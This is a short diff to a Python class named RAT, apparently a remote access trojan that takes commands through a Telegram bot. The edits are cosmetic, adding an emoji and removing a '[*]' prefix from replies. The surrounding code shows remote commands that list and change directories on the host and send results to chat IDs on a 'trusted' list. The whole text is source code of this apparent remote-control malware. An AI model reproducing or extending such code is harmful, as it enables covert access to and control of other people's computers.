@@ -24,9 +24,9 @@ class RAT:
 		MessageLoop(bot, self.bot_handler).run_as_thread()
 		print("Bot connected.")
 		for chat in trusted_chats:
-			bot.sendMessage(chat, "Bot connected.")
+			bot.sendMessage(chat, "🤖 Bot connected.")
 		for user in trusted_users:
-			bot.sendMessage(user, "Bot connected.")
+			bot.sendMessage(user, "🤖 Bot connected.")
 
 		while True:
 			time.sleep(10)
@@ -118,14 +118,14 @@ class RAT:
 				except Exception as e:
 					s = e
 				
-				bot.sendMessage(message["chat"]["id"], "[*] {}".format(str(s)))
+				bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))
 			elif args[0] == "/ls":
 				if len(args) == 1:
 					pth = "."
 				else:
 					pth = args[1]
 				s = '\n'.join(os.listdir(path=pth))
-				bot.sendMessage(message["chat"]["id"], "[*] {}".format(str(s)))
+				bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))
 				
 			elif args[0] == "/cd":
 				path = os.path.abspath(args[1])
